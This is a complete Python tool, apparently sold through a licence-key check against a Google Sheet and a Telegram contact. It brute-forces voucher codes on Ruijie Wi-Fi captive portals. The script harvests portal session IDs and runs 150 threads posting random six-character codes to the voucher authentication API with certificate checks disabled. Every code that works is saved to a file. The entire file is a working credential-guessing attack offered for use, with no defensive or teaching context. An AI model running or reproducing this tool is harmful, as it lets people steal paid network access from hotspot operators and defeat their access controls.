import requests
import random
import string
import time
import os
import threading
import re
import sys
import urllib3
import json
from queue import Queue, Empty
from urllib.parse import urlparse, parse_qs, urljoin
from datetime import datetime

# SSL warning တွေကို ပိတ်ထားမယ်
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ==============================
# KEY APPROVAL SYSTEM CONFIG
# ==============================
SHEET_ID = "1NbVavISCyYEL5AfEs3QYM1qm1GJDXAZHLcU5t8etf3k"
SHEET_CSV_URL = f"https://docs.google.com/spreadsheets/d/{SHEET_ID}/export?format=csv&gid=0"
LOCAL_KEYS_FILE = os.path.expanduser("~/.turbo_approved_keys.txt")

# Colors
bcyan = "\033[1;36m"
reset = "\033[00m"
white = "\033[0;37m"
bgreen = "\033[1;32m"
bred = "\033[1;31m"
yellow = "\033[0;33m"
magenta = "\033[1;35m"

# ==============================
# EXTREME SCANNER CONFIG
# ==============================
NUM_THREADS = 150             
SESSION_POOL_SIZE = 25       
PER_SESSION_MAX = 150        
SAVE_PATH = "/storage/emulated/0/Download/eng&number.txt"

# GLOBALS
session_pool = Queue()
valid_codes = [] 
valid_lock = threading.Lock()
file_lock = threading.Lock()
DETECTED_BASE_URL = None
TOTAL_TRIED = 0
TOTAL_HITS = 0
CURRENT_CODE = ""
START_TIME = time.time()
stop_event = threading.Event()

# ==============================
# KEY SYSTEM FUNCTIONS
# ==============================
def get_system_key():
    try: uid = os.geteuid()
    except: uid = 1000
    try: username = os.getlogin()
    except: username = os.environ.get('USER', 'unknown')
    return f"{uid}{username}"

def fetch_authorized_keys():
    keys = []
    try:
        response = requests.get(SHEET_CSV_URL, timeout=10)
        if response.status_code == 200:
            for line in response.text.strip().split('\n'):
                line = line.strip()
                if line and not any(x in line.lower() for x in ['username', 'key']):
                    key = line.split(',')[0].strip().strip('"')
                    if key: keys.append(key)
            if keys:
                with open(LOCAL_KEYS_FILE, 'w') as f: f.write('\n'.join(keys))
            return keys
    except: pass
    try:
        if os.path.exists(LOCAL_KEYS_FILE):
            with open(LOCAL_KEYS_FILE, 'r') as f:
                keys = [line.strip() for line in f if line.strip()]
    except: pass
    return keys

def check_approval():
    os.system('clear' if os.name == 'posix' else 'cls')
    print(f"{bcyan}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{reset}")
    print(f"{white}            ⚡ KEY APPROVAL SYSTEM ⚡{reset}")
    print(f"{bcyan}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{reset}")
    
    system_key = get_system_key()
    authorized_keys = fetch_authorized_keys()
    
    if system_key in authorized_keys:
        print(f"\n{bgreen}[✓] STATUS: KEY IS REGISTERED{reset}")
        print(f"{white}[+] Initializing modules and starting scanner...{reset}")
        time.sleep(1.5)
        return True
    else:
        print(f"\n{bred}[×]ERROR:  ❌KEY NOT APPROVED❌{reset}")
        print(f"{white}[-]Your Key: {yellow}{system_key}{reset}")
        print(f"\n{white}Please contact the admin for activation:{reset}")
        print(f"{bcyan}[•]Telegram: {reset}{white}@Su_Ye_21{reset}")
        print(f"{bred}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{reset}")
        return False

def background_key_verification():
    while not stop_event.is_set():
        time.sleep(300) 
        system_key = get_system_key()
        authorized_keys = fetch_authorized_keys()
        if system_key not in authorized_keys:
            stop_event.set()
            os.system('clear' if os.name == 'posix' else 'cls')
            print(f"\n{bred}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{reset}")
            print(f"{bred}    ⚠️ ALERT: YOUR KEY HAS BEEN DEACTIVATED! ⚠️{reset}")
            print(f"{white}    Please contact admin to renew your access.{reset}")
            print(f"{bred}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{reset}")
            os._exit(1)

# ==============================
# SCANNER FUNCTIONS
# ==============================
def get_sid_from_gateway():
    global DETECTED_BASE_URL
    s = requests.Session()
    test_urls = [
        "http://connectivitycheck.gstatic.com/generate_204",
        "http://1.1.1.1",
        "http://10.1.1.1",
        "http://172.16.1.1"
    ]
    
    headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36'}

    for target in test_urls:
        try:
            r1 = s.get(target, allow_redirects=True, timeout=5, headers=headers, verify=False)
            parsed = urlparse(r1.url)
            params = parse_qs(parsed.query)
            
            if 'sessionId' in params:
                DETECTED_BASE_URL = f"{parsed.scheme}://{parsed.netloc}"
                return params['sessionId'][0]
            
            path_match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
            if path_match:
                final_url = urljoin(r1.url, path_match.group(1))
                r2 = s.get(final_url, timeout=5, headers=headers, verify=False)
                parsed_final = urlparse(r2.url)
                DETECTED_BASE_URL = f"{parsed_final.scheme}://{parsed_final.netloc}"
                sid = parse_qs(parsed_final.query).get('sessionId', [None])[0]
                if sid: return sid
        except: continue
    return None

def session_refiller():
    while not stop_event.is_set():
        try:
            if session_pool.qsize() < SESSION_POOL_SIZE:
                sid = get_sid_from_gateway()
                if sid:
                    session_pool.put({'sessionId': sid, 'left': PER_SESSION_MAX})
            time.sleep(1)
        except: time.sleep(3)

def worker_thread():
    global TOTAL_TRIED, TOTAL_HITS, CURRENT_CODE
    thr_session = requests.Session()
    
    # ဤနေရာတွင် logic ကို အက္ခရာ အကြီး၊ အသေး နှင့် ဂဏန်း ပါဝင်အောင် ပြင်ဆင်ထားသည်
    charset = string.ascii_letters + string.digits
    
    while not stop_event.is_set():
        try:
            if not DETECTED_BASE_URL:
                time.sleep(1); continue
                
            try: slot = session_pool.get(timeout=3)
            except Empty: continue
            
            sid = slot.get('sessionId')
            # random.choices သည် charset ထဲမှ စိတ်ကြိုက် 6 လုံး ရွေးထုတ်ပေးမည်
            code = ''.join(random.choices(charset, k=6))
            CURRENT_CODE = code
            
            headers = {
                'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
                'Content-Type': 'application/json',
                'Accept': 'application/json',
                'Origin': DETECTED_BASE_URL,
                'Referer': f"{DETECTED_BASE_URL}/",
                'X-Requested-With': 'XMLHttpRequest'
            }
            
            payload = {'accessCode': code, 'sessionId': sid, 'apiVersion': 1}
            api_url = f"{DETECTED_BASE_URL}/api/auth/voucher/"
            
            r = thr_session.post(api_url, json=payload, headers=headers, timeout=10, verify=False)
            TOTAL_TRIED += 1
            
            try:
                res_data = r.json()
                is_hit = False
                if res_data.get('code') == 0: is_hit = True
                if res_data.get('success') is True: is_hit = True
                if str(res_data.get('result', '')).lower() == 'success': is_hit = True
                
                if is_hit:
                    with valid_lock:
                        if code not in valid_codes:
                            valid_codes.append(code)
                            TOTAL_HITS += 1
                            save_locally(code, sid)
                
                msg = str(res_data.get('message', '')).lower()
                if any(x in msg for x in ["timeout", "expired", "invalid session"]):
                    continue 
            except:
                pass
            
            if r.status_code == 200:
                slot['left'] -= 1
                if slot['left'] > 0: session_pool.put(slot)
                
        except: pass

def save_locally(code, sid):
    ts = datetime.now().strftime("%H:%M:%S")
    try:
        os.makedirs(os.path.dirname(SAVE_PATH), exist_ok=True)
        with file_lock:
            with open(SAVE_PATH, "a") as f: f.write(f"{ts} | {code} | SID: {sid}\n")
    except: pass

def live_dashboard():
    while not stop_event.is_set():
        os.system('clear' if os.name == 'posix' else 'cls')
        elapsed = time.time() - START_TIME
        
        print(f"{bgreen}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{reset}")
        print(f"{white}          🔎 RUIJIE VOUCHER CODE SCANNER 🔍{reset}")
        print(f"{bgreen}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{reset}")
        
        print(f"[🌐] URL     :{white}{DETECTED_BASE_URL}{reset}")
        print(f"[📊] TRIED   :{bcyan}{TOTAL_TRIED:,}{reset}")
        print(f"[🎯] HITS    :{bgreen}{TOTAL_HITS}{reset}")
        print(f"[⏳] TIME    :{yellow}{int(elapsed)}s{reset}")
        print(f"[🔑] LAST    :{white}{CURRENT_CODE}{reset}")
        print(f"{bgreen}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{reset}")
        
        print(f"{bgreen}SUCCESS CODES:{reset}")
        if not valid_codes:
            print(f"{white}Searching.....{reset}")
        else:
            for c in valid_codes[-5:]:
                print(f"{bgreen}▶▶▶VALID▶▶▶▶ :{reset} {white}{c}{reset}")
        
        print(f"{bgreen}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{reset}")
        print(f"{bred}(Press CTRL+C to Safely Exit){reset}")
        time.sleep(0.8)

if __name__ == "__main__":
    if check_approval():
        try:
            threading.Thread(target=background_key_verification, daemon=True).start()
            threading.Thread(target=session_refiller, daemon=True).start()
            threading.Thread(target=live_dashboard, daemon=True).start()
            for _ in range(NUM_THREADS):
                threading.Thread(target=worker_thread, daemon=True).start()
            while True: time.sleep(1)
        except KeyboardInterrupt:
            stop_event.set()
            print(f"\n{yellow}[!] Gracefully stopping threads...{reset}")
            print(f"{bgreen}[✓] All results saved to: {SAVE_PATH}{reset}")
    else:
        sys.exit(1)
